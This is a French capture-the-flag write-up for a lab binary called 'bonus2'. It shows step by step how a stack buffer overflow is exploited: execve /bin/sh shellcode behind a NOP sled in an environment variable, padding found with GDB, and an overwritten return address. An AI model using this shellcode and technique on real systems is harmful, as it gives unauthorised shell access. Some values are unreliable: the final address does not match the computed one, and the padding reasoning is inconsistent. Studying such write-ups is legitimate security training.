On va proceder de la meme maniere que l'exercice precedent.

--> Pour contourner la petite taille des buffers, on place notre shellcode dans une variable d'environnement, précédé d'un "NOP sled" (toboggan de `\x90` de 1000 octets) pour eviter les décalages mémoire entre GDB et l'environnement réel.

```shell
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Nous allons egalement passe en LANG=nl afin de passer par les 2 strcpy:

```shell
export LANG="nl"
```

## Etape 1: Recuperer l'adresse du shellcode

On utilise GDB pour trouver l'adresse exacte de notre variable `SHELLCODE` en mémoire lors de l'exécution :

```shell
gdb ./bonus2
break main
# Breakpoint 1, 0x0804852f in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xbffff51f
```

--> L'adresse de base est `0xbffff51f`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xbffff51f + 0x60` = **`0xBFFFF57F`**
En Little Endian, notre adresse finale est : `\x7f\xf5\xff\xbf`

## Etape 2: Trouver le padding

Tout comme le bonus0, on va chercher l'endroit du segfault:

```shell
gdb ./bonus2
run 0123456789qwertyuiopasd+ghjklzxcvbnm0123456789 0123456789QWERTYUIOPASDFGHJKLZXCVBNM0123456789
#0x4a484746 in ?? ()
print/c 0x4a484746
#$1 = 70 'F'
```

(Bien sur l'adresse change a chaque fois, le padding changera donc aussi)

--> A etait le 24eme char de notre chaine, on en deduit que le padding est de 23.

## Etape 3: Executer

La structure du deuxième input sera : `[x bytes padding] + [Adresse EIP]`

```shell
./bonus2 0123456789qwertyuiopasd+ghjklzxcvbnm0123456789 $(python -c 'print "a"*23 + "\x76\xf5\xff\xbf"')
```

--> On obtient notre flag pour le bonus3 !